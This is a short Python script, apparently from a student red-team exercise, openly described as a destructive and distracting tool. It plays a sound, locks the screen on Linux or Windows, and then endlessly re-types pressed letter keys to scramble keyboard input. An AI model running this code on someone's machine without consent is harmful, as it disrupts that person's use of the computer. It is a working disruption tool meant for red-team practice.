""" 
File: RedTeamDistractionTool.py
Description: A destructive/distracting red team tool that will play an annoying sound,
            lock your computer screen, and manipulate keyboard input.
Language: Python3
Author: Kelly Vo - kdv6978@rit.edu
"""

import ctypes
import keyboard
import os
import platform as p
from playsound import playsound as play
import random as r
import string
from threading import Thread


'''
lockScreen locks the computer screen
'''
def lockScreen():
    # Error handler
    try:
        # If the system platform is linux
        if p.system().lower() == 'linux':
            # Lock screen
            os.popen('gnome-screensaver-command --lock')
        # If the system platform is windows
        if p.system().lower() == 'windows':
            # Lock screen
            ctypes.windll.user32.LockWorkStation()
    # Catches error by passing
    except:
        pass


'''
playSound plays the sound
'''
def playSound():
    # Plays Dial.mp3
    play('Dial.mp3')


'''
keyPressed takes in an input key and randomly from 1-5 repeat the input key
# Param - key is an input key
'''
def keyPressed(key):
    # Error handler
    try:
        # pressNum is a random number from 1-5
        pressNum = r.randint(1, 5)
        # if input key is pressed
        if keyboard.is_pressed(key):
            # Press the input key pressNum amount of times
            for i in range(0, pressNum):
                keyboard.write(key)
    # Catches error by passing
    except:
        pass


'''
main runs program
'''
def main():
    # New thread is created so that the program can play the sound and move
    # on to the other lines of code, instead of waiting for the sound to end.
    thread = Thread(target=playSound)
    thread.start()
    # Locks the computer screen
    lockScreen()
    # Constantly waiting for keyboard input so that the program can mimic the
    # keyboard
    while True:
        # keys is a list of ascii characters [a-zA-Z]
        keys = list(string.ascii_letters)
        for key in keys:
            keyPressed(key)


# Calls main to run program
if __name__ == "__main__":
    main()
